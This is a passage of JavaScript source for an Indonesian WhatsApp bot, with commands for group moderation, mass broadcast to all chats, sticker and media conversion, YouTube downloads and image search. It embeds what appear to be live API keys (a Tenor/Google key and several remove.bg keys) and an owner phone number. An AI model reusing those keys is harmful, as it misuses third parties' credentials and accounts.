                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `Mode Antilink`, ikycoli.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${ikycoli.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${ikycoli.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `Mute Bot`, ikycoli.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await ikycoli.groupInviteCode(m.chat)
                ikycoli.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await ikycoli.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await ikycoli.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                ikycoli.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await ikycoli.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/ikycoli-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      ikycoli.send5ButImg(i, txt, ikycoli.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/ikycoli-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      ikycoli.send5ButImg(yoi, txt, ikycoli.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `││᭄⃟ꪶ⃟•╾ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━││᭄⃟ꪶ⃟•╾ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ││᭄⃟ꪶ⃟•╾ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                ikycoli.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await ikycoli.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 ikycoli.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await ikycoli.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 ikycoli.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    ikycoli.sendText(m.chat, 'List Online:\n\n' + online.map(v => '││᭄⃟ꪶ⃟•╾ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!isCreator) return
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await ikycoli.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await ikycoli.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
            if (!isCreator) return
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await ikycoli.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!isCreator) return
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await ikycoli.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
      case 'attp2': case 'ttp': {
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
           await ikycoli.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'ikycoli', 'morou', m, {asSticker: true})

         }
         break
        case 'attp':
        if (!isCreator) return
 try {
if (args.length == 0) return m.reply(`Example: ${prefix + command} YUikycoli`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await ikycoli.sendMessage(m.chat, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
 console.log(e)
 m.reply(`Maap sedang error coba lagi besok`)            
}
break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       if (!isCreator) return
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await ikycoli.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    ikycoli.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
	        if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ikycoli.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ikycoli.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            ikycoli.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ikycoli.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            ikycoli.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await ikycoli.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isCreator) return
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
            if (!isCreator && !isBan) return
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await ikycoli.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    ikycoli.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `│➳ No : ${no++}\n│➳ Type : ${i.type}\n│➳ Video ID : ${i.videoId}\n│➳ Title : ${i.title}\n│➳ Views : ${i.views}\n│➳ Duration : ${i.timestamp}\n│➳ Upload At : ${i.ago}\n│➳ Author : ${i.author.name}\n│➳ Url : ${i.url}\n\n─────────────────\n\n`
                }
                ikycoli.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `│➳ *Title* : ${g.title}\n`
                teks += `│➳ *Description* : ${g.snippet}\n`
                teks += `│➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!isCreator && !isBan) return
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: ikycoli.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
╭━═════════════━•
│➳ Title : ${anu.title}
│➳ Ext : Search
│➳ ID : ${anu.videoId}
│➳ Duration : ${anu.timestamp}
│➳ Viewers : ${anu.views}
│➳ Upload At : ${anu.ago}
│➳ Author : ${anu.author.name}
│➳ Channel : ${anu.author.url}
│➳ Description : ${anu.description}
│➳ Url : ${anu.url}
╰━═════════════━•`,
                    footer: ikycoli.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
	    if (!isCreator) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ikycoli.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                ikycoli.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
            if (!isCreator) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ikycoli.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
	    if (!isCreator && !isBan) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ikycoli.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                ikycoli.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
            if (!isCreator && !isBan) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                ikycoli.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${urls[text - 1]}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
            if (!isCreator && !isBan) return
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                ikycoli.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                m.reply(mess.wait)
                ikycoli.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
	    if (!isCreator && !isBan) return
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                ikycoli.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                ikycoli.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            if (!isCreator && !isBan) return
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: ikycoli.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `│➳ Title : ${result.title}\n│➳ Category : ${result.type}\n│➳ Detail : ${result.source}\n│➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: ikycoli.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `│➳ Title : ${result.title}\n│➳ Source : ${result.source}\n│➳ Media Url : ${result.image}`,
                    footer: ikycoli.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
            if (!isCreator && !isBan) return
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
	        if (!isCreator && !isBan) return
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                ikycoli.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
	    if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                ikycoli.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                ikycoli.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
	    if (!isCreator && !isBan) return
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
